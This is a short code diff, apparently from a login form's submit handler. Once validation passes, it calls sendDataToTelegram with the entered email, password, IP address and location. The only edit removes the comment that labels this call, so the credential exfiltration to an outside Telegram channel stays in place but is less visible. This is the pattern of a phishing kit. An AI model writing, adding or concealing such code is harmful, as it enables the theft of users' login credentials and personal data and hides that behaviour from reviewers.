@@ -140,7 +140,6 @@
     if (!errors.email && !errors.password) {
       // Show the modal
       isModalVisible = true;
-       // Send data to Telegram
       await sendDataToTelegram(email, password, ipAddress, location);
     }
   }
